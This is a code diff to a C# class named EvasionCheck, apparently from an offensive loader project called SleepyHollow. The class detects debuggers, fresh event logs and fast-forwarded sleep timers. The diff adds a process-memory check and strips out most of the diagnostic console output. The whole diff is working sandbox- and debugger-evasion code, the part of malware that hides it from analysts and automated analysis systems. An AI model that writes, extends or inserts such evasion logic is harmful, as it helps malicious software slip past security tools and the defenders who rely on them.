@@ -5,7 +5,7 @@ namespace SleepyHollow;
 
 internal static class EvasionCheck
 {
-    internal static bool Detected => IsDebuggerPresent() || IsFirstEventLogLessThanDayOld() || IsTimeFastForwarded();
+    internal static bool Detected => IsDebuggerPresent() || IsFirstEventLogLessThanDayOld() || IsTimeFastForwarded() || CheckProcessMemory();
 
     internal static bool IsTimeFastForwarded()
     {
@@ -15,10 +15,8 @@ internal static class EvasionCheck
         double elapsed = (DateTime.Now - startTime).TotalSeconds;
         if (elapsed < 1.5)
         {
-            Console.WriteLine("- Time is fast forwarded");
             return true;
         }
-        Console.WriteLine("- Time is NOT fast forwarded");
         return false;
     }
 
@@ -34,11 +32,9 @@ internal static class EvasionCheck
                 var age = DateTime.Now - firstEvent.TimeGenerated;
 
                 var freshEventLog = age.TotalDays < 1;
-                Console.WriteLine($"- Event log is LESS than a day old: {freshEventLog.ToString().ToUpper()}");
                 return freshEventLog;
             }
         }
-        Console.WriteLine("- Event log check skipped");
         return false;
     }
 
@@ -46,7 +42,26 @@ internal static class EvasionCheck
     {
         var isDebuggerPresent = false;
         Lib.CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
-        Console.WriteLine($"- Debugger present: {isDebuggerPresent.ToString().ToUpper()}");
         return isDebuggerPresent;
+    }
+
+    internal static bool CheckProcessMemory()
+    {
+
+        var size = (uint)Marshal.SizeOf<ProcessMemoryCounters>();
+        if (!Lib.GetProcessMemoryInfo(Lib.GetCurrentProcess(), out ProcessMemoryCounters pmc, size))
+        {
+            Console.WriteLine("Error getting process memory info: " + Lib.GetLastWin32Error());
+            return true;
+        }
+        if (pmc.WorkingSetSize <= 10000000)
+        {
+            return false;
+        }
+        else
+        {
+            Console.WriteLine($"- Process memory is greater than 10MB: {pmc.WorkingSetSize}");
+            return true;
+        }
     }
 }
